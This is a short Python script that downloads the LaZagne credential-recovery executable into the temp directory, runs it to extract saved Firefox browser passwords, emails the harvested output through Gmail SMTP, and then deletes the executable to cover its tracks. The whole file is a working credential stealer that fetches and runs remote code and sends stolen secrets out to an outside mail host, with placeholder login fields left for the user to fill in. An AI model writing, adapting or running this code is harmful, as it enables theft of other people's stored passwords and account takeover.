import requests
import subprocess
import smtplib
import os
import tempfile

def send_mail(email,password,message):
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

def download(url):
    image = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,'wb') as b:
        b.write(image.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe") 
check = subprocess.check_output('lazagne.exe browsers -firefox',shell=True) 
send_mail("your email","your password", check)
os.remove('lazagne.exe')
